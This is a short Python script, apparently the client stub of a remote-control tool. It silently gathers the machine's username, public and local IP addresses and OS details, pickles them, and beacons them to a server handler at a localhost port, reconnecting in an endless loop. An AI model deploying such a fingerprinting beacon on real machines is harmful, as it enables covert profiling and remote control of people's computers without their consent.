import getpass, requests, socket, pickle, loguru, time
import platform

from core.handler import ServerHandler

deviceProfile: list[str] = [
    getpass.getuser(),                              # Username
    requests.get('https://api.ipify.org/').text,    # Public IP Address
    socket.gethostbyname(socket.gethostname())      # Local IP Address
]

additionalData: dict = {
    "Operating System": platform.platform()
}

compressedData: bytes = pickle.dumps(deviceProfile)

while True:
    try:
        s = ServerHandler(server_address = ('127.0.0.1', 3451), deviceData = compressedData, additionalData = additionalData)
        s.start()

    except (ConnectionRefusedError, ConnectionResetError):
        loguru.logger.error('Connection to the server is unreachable, an attempt will be made to reconnect')
        time.sleep(2)
